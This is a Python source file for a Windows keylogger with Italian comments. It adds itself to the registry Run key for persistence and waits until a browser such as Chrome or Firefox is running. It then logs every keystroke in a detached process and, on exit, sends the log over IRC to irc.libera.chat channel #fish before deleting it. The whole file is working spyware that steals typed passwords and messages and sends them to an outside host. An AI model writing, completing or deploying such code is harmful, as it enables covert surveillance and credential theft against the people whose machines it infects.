import wmi
import win32api
import win32process
import concurrent.futures
import keyboard
from atexit import register
from os import remove, path
from string import ascii_letters, digits
from random import choice, randint
import socket
from time import sleep
from ctypes import windll
import winreg as reg
from sys import argv

# Configuration section
OUT = "out.txt"     # Out filename

def randomUSR():    # Create random username for IRC
    user = ''
    for _ in range(randint(5,15)):
        user += ''.join(choice(ascii_letters+digits))
    return user
USERNAME = randomUSR()
## End of Configuration section

# Funzione che controlla i permessi
# se amministratore si imposta all'avvio, altrimenti bisogna trovare una soluzione alternativa
def autoExecOnStartup():
    def checkAdmin():
        try:
            windll.shell32.IsUserAnAdmin()
            return True
        except AttributeError:
            return False
        
    if checkAdmin():
        # Setup
        prog_name = path.basename(argv[0])
        prog_path = path.dirname(path.abspath(argv[0]))
        print(prog_path) #Debug
        key_path = r"Software\\Microsoft\Windows\\CurrentVersion\\Run"
        # Change REG key
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, prog_name, 0, reg.REG_SZ, prog_path)
            reg.CloseKey(key)
            print(f"Il programma {prog_name} è stato aggiunto all'avvio automatico.")
        except Exception as e:
            print(f"Errore durante l'impostazione dell'avvio automatico: {e}")
    
    else:
        # Cercare metodo alternativo
        alternative_path = "C:\\Users\\current_user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        # Creare collegamento in alternative_path
        pass

# Function on program's exit
def sendAndErase():
    # IRC
    HOST = "irc.libera.chat"
    PORT = 6667 # TLS
    CHANNEL = 'fish'
    NICK = USERNAME
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        remote_IP = socket.gethostbyname(HOST)
        try:
            s.connect((remote_IP, PORT))
        except WindowsError as e:
            print(e)
        s.send(bytes(f'NICK {NICK}\r\n', "UTF-8"))
        s.send(bytes(f'USER {NICK}\r\n', "UTF-8"))
        s.send(bytes(f'JOIN #{CHANNEL}\r\n', "UTF-8"))
        # Debug
        print(f"Connected to {HOST} --> {remote_IP}:{str(PORT)}")
        try:
            with open(OUT, 'rb') as f:
                for l in f:
                    s.send(bytes(f'PRIVMSG {CHANNEL} :{l.decode("UTF-8")}\r\n', "UTF-8"))
                    print(l.decode())
            remove(OUT)
        except FileNotFoundError:
            pass
        
register(sendAndErase)


# Keylog
def logPress(key):
    with open(OUT, "a") as f:
        s = str(key).split(' ')[0].split("(")[1]
        if s == 'space':
            s = " "
        if s == "enter":
            s = "\nenter\n"
        f.write(s + "\n")
        

def K():      
    # Start recording keystrokes
    keyboard.on_press(logPress)
    # While True
    keyboard.wait()
     
# Start K() as detach process    
def startK():
    # Create a new console to prevent the new process from inheriting the current console
    hstdout = win32api.GetStdHandle(win32api.STD_OUTPUT_HANDLE)
    creation_flags = win32process.CREATE_NEW_CONSOLE | win32process.DETACHED_PROCESS

    # Start the process in a new console session
    si = win32process.STARTUPINFO()
    si.dwFlags = win32process.STARTF_USESTDHANDLES
    si.hStdInput = hstdout
    si.hStdOutput = hstdout
    si.hStdError = hstdout

    # Create a process executor to start the function in a separate process
    with concurrent.futures.ProcessPoolExecutor() as executor:
        try:
            executor.submit(K)
        except InterruptedError:
            return 0


# Process listing functions
def getProcs(manager):
    procsDict = {}
    # Debug
    print("pid   Process name")
    for process in manager.Win32_Process():
        # Debug
        print(f"{process.ProcessId:<10} {process.Name}") 
        procsDict.__setitem__(process.ProcessId, process.Name)
    
    return procsDict
# Logic bomb
def filteringProcs(processes):
    # I suggest to add only after-login processes, like web browsers/desktop programs
    # If I can find a process of procList inside processesDict --> activate K()
    procList = ["firefox.exe", "brave.exe", "chrome.exe", "edge.exe"]
    for pid in processes.keys():
        if(str(processes.get(pid)) in procList):
            return 0
    return 1
            
     
# Debug function (IRC Debug)
def auto():
    autoExecOnStartup()
    
    
    remove(OUT)
    f = open(OUT, "+a", encoding='UTF-8')
    f.write("ciao!")
    f.close()
    sleep(3)
    keyboard.send("ctrl+c")
    sendAndErase()
           
if __name__ == "__main__":
    # Debug
    auto()  # Eliminare per programma completo, funge solo da funzione di debug per velocizzare il processo di testing per upload
    
    # Start
    autoExecOnStartup()
    manager = wmi.WMI() # Set win control
    # Continue read/filter processes until I find an occurence (see procList[] in filteringProcs())
    while filteringProcs(getProcs(manager)) == 1:
        filteringProcs(getProcs(manager))
    startK()    # Strike the keylogger as detached process